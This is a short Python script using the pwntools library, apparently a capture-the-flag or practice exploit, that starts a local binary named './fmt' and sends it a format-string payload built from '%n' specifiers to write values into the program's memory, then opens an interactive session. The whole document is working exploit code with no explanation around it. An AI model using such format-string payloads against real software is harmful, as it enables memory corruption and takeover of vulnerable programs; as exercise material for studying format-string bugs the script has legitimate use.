from pwn import *
sh=process('./fmt')
context.log_level='debug'
payload="a"*4+"%1$n"+'aa'+"%2$n"+'cc'+"%3$n"
sh.sendline(payload)
sh.interactive()
